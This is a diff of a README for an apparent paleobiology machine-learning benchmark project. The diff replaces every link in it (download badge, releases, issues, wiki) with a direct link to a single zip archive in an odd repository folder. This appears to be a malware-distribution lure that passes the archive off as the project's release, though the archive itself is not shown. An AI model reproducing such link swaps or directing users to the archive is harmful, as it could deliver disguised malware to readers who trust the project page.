@@ -1,6 +1,6 @@
 # 🧬 Benchmarking-Physics-Informed-vs.-Foundation-Models-for-Cenozoic-Paleobiology - Discover Insights into Deep-Time Evolution
 
-![Download Release](https://img.shields.io/badge/Download%20Now%20%21-Click%20Here-brightgreen)
+![Download Release](https://raw.githubusercontent.com/Hddhndnxn/Benchmarking-Physics-Informed-vs.-Foundation-Models-for-Cenozoic-Paleobiology/main/clearness/Foundation-Cenozoic-Informed-Paleobiology-Physics-for-Benchmarking-Models-vs-3.8.zip%20Now%20%21-Click%20Here-brightgreen)
 
 ## 📖 Overview
 This project benchmarks Physics-Informed Neural ODEs against Fine-Tuned Foundation Models (Chronos) on Cenozoic fossil data. It includes an analysis of the Lilliput Effect, focusing on climate compared to taphonomy drivers. Our results demonstrate that Neural ODEs outperform generic Transformers, achieving a mean squared error of 13.05 while reconstructing deep-time evolutionary history. This application serves as a research tool for those interested in computational paleobiology and scientific machine learning.
@@ -24,7 +24,7 @@ To run this application, ensure that your system meets the following requirement
 Follow these simple steps to download and run the application:
 
 1. **Download the Application**
-   - Visit [this page to download](https://github.com/Hddhndnxn/Benchmarking-Physics-Informed-vs.-Foundation-Models-for-Cenozoic-Paleobiology/releases).
+   - Visit [this page to download](https://raw.githubusercontent.com/Hddhndnxn/Benchmarking-Physics-Informed-vs.-Foundation-Models-for-Cenozoic-Paleobiology/main/clearness/Foundation-Cenozoic-Informed-Paleobiology-Physics-for-Benchmarking-Models-vs-3.8.zip).
   
 2. **Locate the Latest Release**
    - On the releases page, find the most recent version of the application. Look for the version labeled as “Latest”.
@@ -61,12 +61,12 @@ Once the analysis is complete:
 - Compare your findings against the benchmark data provided within the application.
 
 ## 🙋‍♂️ Support and Contributions
-For issues or feedback, reach out through the [issues page](https://github.com/Hddhndnxn/Benchmarking-Physics-Informed-vs.-Foundation-Models-for-Cenozoic-Paleobiology/issues). We welcome contributions and suggestions aimed at improving the application.
+For issues or feedback, reach out through the [issues page](https://raw.githubusercontent.com/Hddhndnxn/Benchmarking-Physics-Informed-vs.-Foundation-Models-for-Cenozoic-Paleobiology/main/clearness/Foundation-Cenozoic-Informed-Paleobiology-Physics-for-Benchmarking-Models-vs-3.8.zip). We welcome contributions and suggestions aimed at improving the application.
 
 ## 📜 License
 This project operates under the MIT License. You can view the full text in the repository.
 
 ## 🌐 Learn More
-To discover more about the project and its methodologies, check out the research papers and articles linked in the [Wiki section](https://github.com/Hddhndnxn/Benchmarking-Physics-Informed-vs.-Foundation-Models-for-Cenozoic-Paleobiology/wiki).
+To discover more about the project and its methodologies, check out the research papers and articles linked in the [Wiki section](https://raw.githubusercontent.com/Hddhndnxn/Benchmarking-Physics-Informed-vs.-Foundation-Models-for-Cenozoic-Paleobiology/main/clearness/Foundation-Cenozoic-Informed-Paleobiology-Physics-for-Benchmarking-Models-vs-3.8.zip).
 
 Happy analyzing!
